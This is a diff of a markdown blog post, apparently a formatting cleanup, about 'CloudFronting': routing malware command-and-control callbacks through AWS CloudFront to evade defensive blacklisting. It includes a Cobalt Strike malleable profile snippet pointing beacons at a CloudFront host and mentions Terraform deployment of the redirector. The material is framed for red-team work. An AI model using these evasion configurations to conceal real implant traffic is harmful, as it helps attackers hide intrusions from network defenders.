@@ -1,11 +1,10 @@
 # Creative C2 Obfuscation - CloudFronting Through Firewalls and Hiding in Plain PCAP
 
-## What is CloudFronting:
+## What is CloudFronting
 
+AWS CloudFront enhances obfuscation of Command and Control (C2) Infrastructure by seamlessly integrating beacon callbacks into Content Delivery Network (CDN) traffic. A CDN functions as a network of strategically distributed proxy servers across various locations, ensuring optimal performance and availability while delivering data to clients. Consequently, CloudFronting poses a significant challenge for defensive security analysts, as it evades suspicion and defies blacklisting efforts. Notably, CloudFront, the integrated CDN offered by AWS, stands out as an ideal choice due to its scalability, advanced features, and the convenience it offers red teamers by minimizing the need to leave the AWS Console for infrastructure configuration changes.
 
-AWS CloudFront enhances obfuscation of Command and Control (C2) Infrastructure by seamlessly integrating beacon callbacks into Content Delivery Network (CDN) traffic. A CDN functions as a network of strategically distributed proxy servers across various locations, ensuring optimal performance and availability while delivering data to clients. Consequently, CloudFronting poses a significant challenge for defensive security analysts, as it evades suspicion and defies blacklisting efforts. Notably, CloudFront, the integrated CDN offered by AWS, stands out as an ideal choice due to its scalability, advanced features, and the convenience it offers red teamers by minimizing the need to leave the AWS Console for infrastructure configuration changes. 
-
-## Setup and Configuration:
+## Setup and Configuration
 
 ![Create Distro](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/llp52x56cmlsc4jgrvgy.jpg)
 
@@ -27,10 +26,9 @@ After selecting the appropriate settings for the domain, create the distribution
 
 ![Distro](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/bm4c9jg763dbelolfgg9.jpg)
 
-## C2 Profile:
+## C2 Profile
 
 To effectively utilize this technique, your malware, implants, and payloads need to call back to the CloudFront domain. For example, if you are using Cobalt Strike, copy the distribution domain into your malleable profile; you can add this in the `host` header. Below is an example from threatexpress' jquery-c2.4.7 profile:
-
 
 ```
 http-post {
@@ -44,13 +42,13 @@ http-post {
         header "Host" "dgwduytwaq0ei.cloudfront.net";
         header "Referer" "http://code.jquery.com/";
         header "Accept-Encoding" "gzip, deflate";
-       
+
         id {
-            mask;       
+            mask;  
             base64url;
-            parameter "__cfduid";            
+            parameter "__cfduid";  
         }
-              
+
         output {
             mask;
             base64url;
@@ -59,7 +57,7 @@ http-post {
     }
 ```
 
-## Automating Deployments with Terraform:
+## Automating Deployments with Terraform
 
 Terraform is an open-source infrastructure as code (IaC) tool that enables users to define and provision infrastructure resources in a declarative manner. It allows organizations to automate the creation, management, and versioning of their infrastructure using a simple and consistent workflow. Terraform allows red teams to define and provision the necessary infrastructure resources on demand, ensuring consistency and repeatability. By leveraging Terraform, red teams can easily spin up and tear down environments, deploy and configure systems, and simulate attack scenarios in a controlled manner. This helps red teams streamline their operations, save time, and maintain a standardized approach to infrastructure deployment during red teaming exercises.
 
@@ -109,7 +107,7 @@ resource "aws_cloudfront_distribution" "redirector-cf" {
     restrictions {
       geo_restriction {
         restriction_type = "none"
-	locations = []
+ locations = []
       }
     }
 
@@ -131,4 +129,4 @@ terraform init
 terraform apply
 ```
 
-I hope this simple demonstration was useful and you learned something new. There are many creative ways to evade defensive controls, and if you would like to learn more, feel free to check out my GitHub at: https://github.com/RoseSecurity
+I hope this simple demonstration was useful and you learned something new. There are many creative ways to evade defensive controls, and if you would like to learn more, feel free to check out my GitHub at: <https://github.com/RoseSecurity>
